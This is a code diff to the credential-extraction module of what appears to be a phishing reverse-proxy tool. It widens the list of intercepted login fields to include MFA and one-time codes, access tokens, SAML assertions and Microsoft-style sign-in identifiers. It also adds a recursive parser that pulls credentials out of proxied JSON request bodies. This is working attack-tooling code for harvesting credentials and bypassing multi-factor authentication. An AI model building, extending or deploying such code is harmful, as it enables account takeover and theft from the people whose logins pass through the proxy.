@@ -21,6 +21,7 @@ from .crypto import encrypt
 logger = logging.getLogger("bluephishproxy.proxy")
 
 _CREDENTIAL_FIELDS: dict[str, str] = {
+    # --- username / identity fields ---
     "username": "username",
     "user": "username",
     "email": "username",
@@ -32,6 +33,10 @@ _CREDENTIAL_FIELDS: dict[str, str] = {
     "usr": "username",
     "j_username": "username",
     "session[username_or_email]": "username",
+    "identifier": "username",
+    "signinname": "username",
+    "federationredirecturl": "",  # skip — not a credential
+    # --- password / secret fields ---
     "password": "password",
     "passwd": "password",
     "pass": "password",
@@ -40,7 +45,28 @@ _CREDENTIAL_FIELDS: dict[str, str] = {
     "j_password": "password",
     "credentials[password]": "password",
     "session[password]": "password",
+    "accesstoken": "password",
+    "credential": "password",
+    "otp": "password",
+    "otpcode": "password",
+    "totp": "password",
+    "verificationcode": "password",
+    "mfacode": "password",
 }
+
+_JSON_USERNAME_KEYS = frozenset({
+    "username", "user", "email", "login", "loginfmt",
+    "userid", "user_id", "account", "identifier",
+    "signinemailaddress", "signinname", "upn",
+    "federateduser", "displayname",
+})
+
+_JSON_PASSWORD_KEYS = frozenset({
+    "password", "passwd", "pass", "pwd", "secret",
+    "credential", "credentials", "accesstoken",
+    "otp", "otpcode", "totp", "verificationcode", "mfacode",
+    "assertion", "sas", "token",
+})
 
 _HOP_BY_HOP = frozenset({
     "connection", "keep-alive", "proxy-authenticate",
@@ -74,6 +100,46 @@ def extract_credentials(
             password = field_value
 
     return username, password, bool(username or password)
+
+
+def _walk_json(obj: Any, depth: int = 0) -> dict[str, str]:
+    """Recursively scan a JSON object for credential-like key/value pairs."""
+    found: dict[str, str] = {}
+    if depth > 5:
+        return found
+    if isinstance(obj, dict):
+        for key, value in obj.items():
+            if isinstance(value, str) and value:
+                found[key] = value
+            elif isinstance(value, (dict, list)):
+                found.update(_walk_json(value, depth + 1))
+    elif isinstance(obj, list):
+        for item in obj:
+            if isinstance(item, (dict, list)):
+                found.update(_walk_json(item, depth + 1))
+    return found
+
+
+def extract_credentials_json(
+    body: bytes,
+) -> tuple[str, str, dict[str, str], bool]:
+    try:
+        data = json.loads(body)
+    except (json.JSONDecodeError, UnicodeDecodeError):
+        return "", "", {}, False
+
+    flat = _walk_json(data)
+
+    username = ""
+    password = ""
+    for key, value in flat.items():
+        normalized = key.lower().replace("-", "").replace("_", "")
+        if normalized in _JSON_USERNAME_KEYS and not username:
+            username = value
+        elif normalized in _JSON_PASSWORD_KEYS and not password:
+            password = value
+
+    return username, password, flat, bool(username or password)
 
 
 def _filter_request_headers(
